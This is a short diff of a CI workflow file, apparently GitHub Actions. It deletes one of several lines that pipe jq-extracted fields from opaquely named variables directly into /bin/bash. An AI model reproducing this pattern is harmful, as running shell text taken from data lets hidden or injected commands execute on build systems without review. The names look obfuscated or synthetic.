@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$wxjmy96186" | jq -r .vr5 | /bin/bash
           echo $hn5 | jq -r .awr3 | /bin/bash
           printf '%s' "$ziyx20" | jq -r .hsfb83401 | /bin/bash
-          printf '%s' "$mtla71660" | jq -r .muu7410 | /bin/bash
           printf '%s' "$bj47506" | jq -r .yvgp7535 | /bin/bash
 
       - name: Archive data
